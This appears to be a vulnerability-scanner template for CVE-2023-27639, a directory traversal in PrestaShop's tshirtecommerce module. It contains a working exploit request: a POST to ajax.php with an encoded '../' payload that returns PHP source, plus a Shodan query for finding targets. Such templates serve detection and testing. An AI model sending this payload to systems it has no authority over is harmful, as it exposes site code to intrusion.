id: CVE-2023-27639
info:
  name: PrestaShop tshirtecommerce Directory Traversal
  author: MaStErChO
  severity: high
  description: |
   "The Custom Product Designer (tshirtecommerce) module for PrestaShop allows HTTP requests to be forged using POST and GET parameters, enabling a remote attacker to perform directory traversal on the system and view the contents of code files."
  reference:
    - https://www.cvedetails.com/cve/CVE-2023-27639/
    - https://security.friendsofpresta.org/module/2023/03/30/tshirtecommerce_cwe-22.html
  metadata:
    max-request: 1
    product: tshirtecommerce
    framework: prestashop
    shodan-query: http.component:"prestashop"
  tags: cve,cve2023,prestashop,lfi
http:
  - method: POST
    path:
      - "{{BaseURL}}/tshirtecommerce/ajax.php?type=svg"
    body: "url=.%2F..%2Fvendor%2Fjdorn%2Fsql-formatter%2Fexamples&file_name=examples.php"
    headers:
      Content-Type: application/x-www-form-urlencoded
      
    matchers-condition: and    
    matchers:
      - type: word
        words:
          - "SqlFormatter Examples"
      - type: word
        words:
          - "?php"
